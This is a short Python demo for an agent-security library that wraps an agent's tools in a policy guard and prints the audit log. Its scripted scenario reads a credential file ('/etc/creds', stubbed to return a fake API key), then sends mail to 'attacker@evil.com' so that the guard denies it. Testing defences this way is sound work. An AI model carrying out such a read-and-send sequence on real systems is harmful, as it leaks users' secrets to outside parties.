"""AgentDoG paired plugin: client proxy + server diagnosis -> policy deny."""
from __future__ import annotations

import _bootstrap  # noqa: F401

from agentguard import AgentGuard
from backend.api.dev_server import start_dev_server


def read_secret(path: str) -> str:
    return "API_KEY=sk-ABCDEFGH12345678"


def send_email(to: str, body: str) -> str:
    return f"email sent to {to}"


def main() -> None:
    base_url, server, _ = start_dev_server()
    try:
        guard = AgentGuard(
            session_id="exfil",
            server_url=base_url,
            policy="enterprise_default",
            enable_agentdog=True,
        )
        read = guard.wrap_tool(read_secret, capabilities=["read_file"])
        send = guard.wrap_tool(send_email, capabilities=["external_send"])

        print("1. read secret ->", read("/etc/creds"))
        print("2. exfiltrate  ->", send("attacker@evil.com", "see attached"))

        print("\naudit:")
        for rec in guard.flush_audit():
            print(f"  {rec['event_type']:<12} {rec['decision_type']:<22} {rec['reason'][:60]}")
    finally:
        server.shutdown()


if __name__ == "__main__":
    main()
